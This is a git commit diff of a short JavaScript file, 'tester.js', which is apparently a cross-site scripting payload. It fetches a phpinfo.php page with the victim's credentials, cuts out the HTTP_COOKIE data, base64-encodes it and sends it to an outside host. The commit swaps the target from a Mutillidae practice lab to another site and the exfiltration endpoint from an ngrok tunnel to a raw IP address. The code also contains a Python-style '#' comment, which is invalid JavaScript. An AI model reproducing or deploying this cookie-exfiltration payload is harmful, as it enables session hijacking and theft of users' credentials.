be924f0a60a2420351b6a978ed4d9684d5944ca2
powlzbdz <74605366+powlzbdzdz11@users.noreply.github.com>
2024-04-24 21:26:13 -0400

    tester.js

--- tester.js
+++ tester.js
@@ -1,6 +1,6 @@
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-var url = 'https://webinsegura.radwarelatam.com/mutillidae/index.php?popUpNotificationCode=SL1&page=phpinfo.php';
+var url = 'http://christian.marcq.free.fr/php/phpinfo.php';
 req.withCredentials = true; // send cookie header
 req.open('GET', url, false);
 req.send();
@@ -8,6 +8,6 @@ req.send();
 function reqListener() {
 var req2 = new XMLHttpRequest();
 const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 ); # Thats ugly, improve it :)
-req2.open('GET', 'https://81bc-197-205-120-139.ngrok-free.app/?data=' + btoa(sess), false);
+req2.open('GET', 'http://84.247.183.115/?data=' + btoa(sess), false);
 req2.send()
 };
